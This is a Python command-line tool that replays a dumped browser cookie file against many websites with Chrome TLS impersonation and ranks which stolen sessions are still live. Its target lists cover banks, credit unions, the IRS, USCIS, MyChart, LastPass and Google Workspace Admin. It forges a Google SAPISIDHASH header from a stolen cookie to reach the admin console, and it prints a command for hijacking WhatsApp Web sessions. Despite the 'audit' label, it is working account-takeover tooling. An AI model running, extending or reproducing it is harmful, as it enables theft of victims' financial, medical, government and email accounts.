#!/usr/bin/env python3
"""
cookie-probe.py — Systematic multi-domain session audit from Netscape cookie file

Loads a cookie dump (e.g. from browser export or VDT exfil), tests all domains
concurrently using Chrome TLS impersonation, and ranks live sessions by value.

Modes:
  audit     — probe all domains, classify results (alive/redirected/dead)
  targets   — probe a specific subset (banking, cloud, social, etc.)
  top       — test the top-N highest-value domains
  whatsapp  — probe WhatsApp Web session specifically
  sapisid   — compute and test Google SAPISID auth for API access

Usage:
  python3 cookie-probe.py audit --cookies cookies.txt --output results.json
  python3 cookie-probe.py targets --cookies cookies.txt --category banking
  python3 cookie-probe.py top --cookies cookies.txt -n 20
  python3 cookie-probe.py whatsapp --cookies cookies.txt
  python3 cookie-probe.py sapisid --cookies cookies.txt --origin https://admin.google.com

Requirements:
  pip install curl_cffi
"""

import argparse
import concurrent.futures
import hashlib
import json
import sys
import time
from collections import defaultdict
from urllib.parse import urlparse

try:
    from curl_cffi import requests as cffi_requests
except ImportError:
    print("[!] pip install curl_cffi", file=sys.stderr)
    sys.exit(1)


# ─── Category Definitions ────────────────────────────────────────────────────

CATEGORIES = {
    "banking": [
        "roguecuonline.org", "firsttechfed.com", "myfirstccu.org",
        "popmoney.com", "venmo.com", "qbo.intuit.com", "intuit.com",
        "fidelity.com", "schwab.com", "chase.com", "bankofamerica.com",
        "wellsfargo.com", "paypal.com", "cashapp.com", "zelle.com",
    ],
    "cloud": [
        "admin.google.com", "drive.google.com", "mail.google.com",
        "dropbox.com", "icloud.com", "onedrive.com", "box.com",
        "notion.so", "airtable.com", "monday.com",
    ],
    "social": [
        "web.whatsapp.com", "facebook.com", "instagram.com",
        "twitter.com", "x.com", "linkedin.com", "reddit.com",
        "substack.com", "discord.com",
    ],
    "government": [
        "oregon.gov", "dor.oregon.gov", "dmv2u.oregon.gov",
        "sa.www4.irs.gov", "egov.uscis.gov", "revenueonline.dor.oregon.gov",
    ],
    "health": [
        "mychart.ochin.org", "mychartonline.org", "mychart.org",
        "healow.com", "patientfusion.com",
    ],
    "travel": [
        "alaskaair.com", "delta.com", "united.com", "southwest.com",
        "expedia.com", "airbnb.com",
    ],
}

PRIORITY_DOMAINS = [
    ("admin.google.com", "Google Workspace Admin", "CRITICAL"),
    ("mail.google.com", "Gmail", "HIGH"),
    ("drive.google.com", "Google Drive", "HIGH"),
    ("web.whatsapp.com", "WhatsApp Web", "HIGH"),
    ("dropbox.com", "Dropbox", "HIGH"),
    ("roguecuonline.org", "Rogue Credit Union", "CRITICAL"),
    ("firsttechfed.com", "First Tech Federal CU", "CRITICAL"),
    ("myfirstccu.org", "My First CCU", "CRITICAL"),
    ("venmo.com", "Venmo", "HIGH"),
    ("qbo.intuit.com", "QuickBooks Online", "HIGH"),
    ("lastpass.com", "LastPass Vault", "CRITICAL"),
    ("mychart.ochin.org", "MyChart (HIPAA)", "HIGH"),
    ("icloud.com", "iCloud", "HIGH"),
    ("alaskaair.com", "Alaska Air", "MEDIUM"),
    ("dmv2u.oregon.gov", "Oregon DMV", "MEDIUM"),
    ("sa.www4.irs.gov", "IRS", "HIGH"),
    ("egov.uscis.gov", "USCIS", "MEDIUM"),
    ("github.com", "GitHub", "HIGH"),
    ("substack.com", "Substack", "LOW"),
    ("walmart.com", "Walmart", "LOW"),
]


# ─── Cookie Parsing ──────────────────────────────────────────────────────────

def load_cookies_file(path: str) -> list[dict]:
    """Parse Netscape cookie file into list of cookie records."""
    records = []
    with open(path) as f:
        for line in f:
            if line.startswith("#") or not line.strip():
                continue
            parts = line.strip().split("\t")
            if len(parts) < 7:
                continue
            domain, flag, cookie_path, secure, exp, name, value = parts[:7]
            records.append({
                "domain": domain,
                "flag": flag,
                "path": cookie_path,
                "secure": secure == "TRUE",
                "expires": exp,
                "name": name,
                "value": value,
            })
    return records


def cookies_for_url(records: list[dict], url: str) -> dict[str, str]:
    """Extract cookies applicable to a URL."""
    parsed = urlparse(url)
    host = parsed.hostname or ""
    result = {}
    for r in records:
        d = r["domain"].lstrip(".")
        if host == d or host.endswith("." + d):
            result[r["name"]] = r["value"]
    return result


def domain_summary(records: list[dict]) -> dict[str, list[str]]:
    """Summarize which cookie names exist per domain."""
    by_domain = defaultdict(list)
    for r in records:
        by_domain[r["domain"]].append(r["name"])
    return dict(by_domain)


# ─── Session Probe ──────────────────────────────────────────────────────────

CHROME_HEADERS = {
    "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    "Accept-Language": "en-US,en;q=0.9",
    "Sec-Fetch-Site": "none",
    "Sec-Fetch-Mode": "navigate",
    "Sec-Fetch-Dest": "document",
    "Sec-Ch-Ua": '"Chromium";v="126", "Google Chrome";v="126"',
    "Sec-Ch-Ua-Mobile": "?0",
    "Sec-Ch-Ua-Platform": '"macOS"',
}

_SESSION_POOL: cffi_requests.Session | None = None


def get_session(proxy: str | None = None, impersonate: str = "chrome120") -> cffi_requests.Session:
    global _SESSION_POOL
    if _SESSION_POOL is None:
        _SESSION_POOL = cffi_requests.Session(impersonate=impersonate)
        if proxy:
            _SESSION_POOL.proxies = {"http": proxy, "https": proxy}
    return _SESSION_POOL


def probe_url(url: str, cookies: dict, proxy: str | None = None,
              impersonate: str = "chrome120", timeout: int = 15) -> dict:
    """Probe a single URL with Chrome TLS impersonation and session cookies."""
    s = get_session(proxy=proxy, impersonate=impersonate)
    start = time.monotonic()
    try:
        resp = s.get(
            url,
            cookies=cookies,
            headers=CHROME_HEADERS,
            allow_redirects=True,
            timeout=timeout,
        )
        elapsed = time.monotonic() - start
        final_url = str(resp.url)
        target_host = urlparse(url).netloc
        final_host = urlparse(final_url).netloc

        # Classify result
        if resp.status_code == 200 and target_host == final_host:
            status = "ALIVE"
        elif "sign" in final_url.lower() or "login" in final_url.lower() or "auth" in final_url.lower():
            status = "DEAD_AUTH"
        elif target_host != final_host:
            status = "REDIRECTED"
        elif resp.status_code in (401, 403):
            status = "DEAD_403"
        else:
            status = f"HTTP_{resp.status_code}"

        # Extract title
        import re
        title_m = re.search(r"<title>([^<]{1,120})</title>", resp.text, re.IGNORECASE)
        title = title_m.group(1).strip() if title_m else ""

        return {
            "url": url,
            "status": status,
            "http_code": resp.status_code,
            "final_url": final_url,
            "title": title,
            "body_size": len(resp.content),
            "cookies_sent": len(cookies),
            "elapsed_s": round(elapsed, 2),
        }
    except Exception as e:
        return {
            "url": url,
            "status": "ERROR",
            "error": str(e)[:120],
            "elapsed_s": round(time.monotonic() - start, 2),
        }


# ─── Commands ────────────────────────────────────────────────────────────────

STATUS_ICON = {
    "ALIVE": "[+]",
    "DEAD_AUTH": "[ ]",
    "DEAD_403": "[!]",
    "REDIRECTED": "[~]",
    "ERROR": "[E]",
}


def print_result(r: dict, label: str = "", severity: str = ""):
    icon = STATUS_ICON.get(r["status"], "[?]")
    url = r["url"][:50].ljust(50)
    code = r.get("http_code", "---")
    title = r.get("title", "")[:40]
    if label:
        print(f"  {icon} {severity:8s} {label[:25]:25s} {code} {url} {title}")
    else:
        print(f"  {icon} {code} {url} {title}")


def cmd_audit(args):
    records = load_cookies_file(args.cookies)
    summary = domain_summary(records)
    domains = [d for d in summary if not d.startswith("#")]

    # Build canonical probe URL per domain
    probes = []
    for domain in domains:
        host = domain.lstrip(".")
        url = f"https://{host}/"
        cookies = cookies_for_url(records, url)
        if cookies:
            probes.append((url, cookies))

    print(f"[*] Probing {len(probes)} domains with Chrome TLS impersonation")
    print(f"[*] Workers: {args.workers}  Proxy: {args.proxy or 'none'}")

    results = []
    with concurrent.futures.ThreadPoolExecutor(max_workers=args.workers) as pool:
        futures = {
            pool.submit(probe_url, url, cookies, args.proxy, args.impersonate): url
            for url, cookies in probes
        }
        done = 0
        for fut in concurrent.futures.as_completed(futures):
            r = fut.result()
            results.append(r)
            done += 1
            if r["status"] == "ALIVE":
                print(f"  [+] ALIVE  {r['url'][:60]}")
            elif done % 50 == 0:
                print(f"  ... {done}/{len(probes)}")

    alive = [r for r in results if r["status"] == "ALIVE"]
    print(f"\n[+] Results: {len(alive)} ALIVE / {len(results)} probed")
    for r in sorted(alive, key=lambda x: -x["body_size"]):
        print_result(r)

    if args.output:
        with open(args.output, "w") as f:
            json.dump(results, f, indent=2)
        print(f"\n[+] Full results: {args.output}")


def cmd_targets(args):
    records = load_cookies_file(args.cookies)
    category = args.category.lower()
    if category == "list":
        for cat, domains in CATEGORIES.items():
            print(f"  {cat}: {', '.join(domains[:4])}...")
        return

    domains = CATEGORIES.get(category, [])
    if not domains:
        print(f"[!] Unknown category '{category}'. Use --category list")
        return

    print(f"[*] Probing category '{category}' ({len(domains)} domains)")
    for domain in domains:
        url = f"https://{domain.lstrip('.')}/"
        cookies = cookies_for_url(records, url)
        if not cookies:
            print(f"  [ ] No cookies for {domain}")
            continue
        r = probe_url(url, cookies, args.proxy, args.impersonate)
        print_result(r, label=domain)


def cmd_top(args):
    records = load_cookies_file(args.cookies)
    targets = PRIORITY_DOMAINS[:args.n]

    print(f"[*] Probing top-{len(targets)} priority domains")
    print(f"[*] Proxy: {args.proxy or 'none'}")
    print()

    results = []
    with concurrent.futures.ThreadPoolExecutor(max_workers=min(args.workers, len(targets))) as pool:
        futures = {}
        for domain, label, severity in targets:
            url = f"https://{domain.lstrip('.')}/"
            cookies = cookies_for_url(records, url)
            fut = pool.submit(probe_url, url, cookies, args.proxy, args.impersonate)
            futures[fut] = (domain, label, severity)

        for fut in concurrent.futures.as_completed(futures):
            domain, label, severity = futures[fut]
            r = fut.result()
            results.append((severity, label, r))

    # Sort by severity then status
    sev_order = {"CRITICAL": 0, "HIGH": 1, "MEDIUM": 2, "LOW": 3}
    results.sort(key=lambda x: (sev_order.get(x[0], 9), x[2]["status"] != "ALIVE"))

    for severity, label, r in results:
        print_result(r, label=label, severity=severity)

    alive = sum(1 for _, _, r in results if r["status"] == "ALIVE")
    print(f"\n[+] {alive}/{len(results)} sessions alive")


def cmd_whatsapp(args):
    """Test WhatsApp Web session specifically."""
    import re
    records = load_cookies_file(args.cookies)
    url = "https://web.whatsapp.com/"
    cookies = cookies_for_url(records, url)

    wa_token = cookies.get("wa_web_access_token", "")
    if not wa_token:
        print("[!] wa_web_access_token not found in cookie file")
        return

    print(f"[*] wa_web_access_token: {wa_token[:30]}...")
    print(f"[*] Total WA cookies: {len(cookies)}")
    print(f"[*] Testing HTTP session...")

    r = probe_url(url, cookies, args.proxy, args.impersonate)
    print_result(r)

    if args.ws:
        print(f"\n[*] WebSocket probe — use ws-hijack.py for full session:")
        ws_cookie = "; ".join(f"{k}={v}" for k, v in cookies.items())
        print(f"  python3 ws-hijack.py cswsh wss://web.whatsapp.com/ws/chat \\")
        print(f'    --cookies "{ws_cookie[:100]}..." -v')
        print(f"\n  Note: WA Web uses NOISE protocol over WebSocket.")
        print(f"  Token TTL: June 2027")


def cmd_sapisid(args):
    """Compute Google SAPISID hash and test Admin API access."""
    records = load_cookies_file(args.cookies)

    all_google = cookies_for_url(records, "https://admin.google.com/")
    sapisid = all_google.get("SAPISID", "")
    if not sapisid:
        print("[!] SAPISID not found in google.com cookies")
        return

    origin = args.origin
    ts = int(time.time())
    hash_input = f"{ts} {sapisid} {origin}"
    digest = hashlib.sha1(hash_input.encode()).hexdigest()
    auth_header = f"SAPISIDHASH {ts}_{digest}"

    print(f"[*] SAPISID: {sapisid[:25]}...")
    print(f"[*] Origin: {origin}")
    print(f"[*] Authorization: {auth_header}")

    # Build a curl_cffi session to test
    s = cffi_requests.Session(impersonate=args.impersonate)
    if args.proxy:
        s.proxies = {"http": args.proxy, "https": args.proxy}

    # Try Admin console
    print(f"\n[*] Probing {origin} with SAPISID auth...")
    headers = {
        **CHROME_HEADERS,
        "Authorization": auth_header,
        "X-Goog-Authuser": "0",
    }
    try:
        resp = s.get(
            origin,
            cookies=all_google,
            headers=headers,
            allow_redirects=True,
            timeout=20,
        )
        import re
        title_m = re.search(r"<title>([^<]{1,120})</title>", resp.text, re.IGNORECASE)
        title = title_m.group(1).strip() if title_m else ""
        final = str(resp.url)
        print(f"[+] Status: {resp.status_code}")
        print(f"[+] Final: {final[:80]}")
        print(f"[+] Title: {title}")
        if "admin.google.com" in final and "accounts" not in final:
            print("[+] ADMIN CONSOLE REACHED")
        elif "sign" in final.lower() or "accounts" in final:
            print("[ ] Redirected to auth")
    except Exception as e:
        print(f"[!] {e}")


# ─── Main ─────────────────────────────────────────────────────────────────────

def main():
    parser = argparse.ArgumentParser(
        description="Multi-domain session audit with Chrome TLS impersonation"
    )
    parser.add_argument("--proxy", default=None,
                        help="Proxy URL (e.g. socks5://127.0.0.1:1080)")
    parser.add_argument("--impersonate", default="chrome120",
                        help="TLS fingerprint (chrome120, safari17, etc.)")
    parser.add_argument("--workers", type=int, default=20,
                        help="Concurrent probe threads (default 20)")

    sub = parser.add_subparsers(dest="cmd")

    a = sub.add_parser("audit", help="Probe all domains in cookie file")
    a.add_argument("--cookies", required=True)
    a.add_argument("--output", help="JSON output file")

    t = sub.add_parser("targets", help="Probe by category (banking, cloud, etc.)")
    t.add_argument("--cookies", required=True)
    t.add_argument("--category", default="list", help="Category name or 'list'")

    top = sub.add_parser("top", help="Probe top-N priority targets")
    top.add_argument("--cookies", required=True)
    top.add_argument("-n", type=int, default=20, help="Number of targets")

    wa = sub.add_parser("whatsapp", help="Test WhatsApp Web session")
    wa.add_argument("--cookies", required=True)
    wa.add_argument("--ws", action="store_true", help="Show ws-hijack.py command")

    sa = sub.add_parser("sapisid", help="Test Google SAPISID auth")
    sa.add_argument("--cookies", required=True)
    sa.add_argument("--origin", default="https://admin.google.com",
                    help="Target origin for SAPISID hash")

    args = parser.parse_args()
    if not args.cmd:
        parser.print_help()
        return

    dispatch = {
        "audit": cmd_audit,
        "targets": cmd_targets,
        "top": cmd_top,
        "whatsapp": cmd_whatsapp,
        "sapisid": cmd_sapisid,
    }
    dispatch[args.cmd](args)


if __name__ == "__main__":
    main()
